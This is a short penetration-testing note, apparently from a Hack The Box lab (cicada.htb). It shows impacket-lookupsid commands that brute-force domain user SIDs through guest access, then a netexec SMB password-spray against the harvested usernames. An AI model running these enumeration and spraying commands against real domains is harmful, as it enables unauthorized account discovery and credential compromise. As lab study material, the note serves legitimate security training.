## lookupsid.py 
https://github.com/fortra/impacket/blob/master/examples/lookupsid.py

This tool will try brute forcing Windows Security Identifiers (SIDs) of any users in the AD domain.

To enumerate the domain, we will specify the `guest` user, the domain name, and `-no-pass` for no password. 
```
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
impacket-lookupsid support@cicada.htb -no-pass
```
In this scenario we want to perform password spraying with a known password.
1. Gett all usernames
2. Try the password against all of them
```
impacket-lookupsid support@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt

cat users.txt

netexec smb cicada.htb -u users.txt -p '<password>'
```
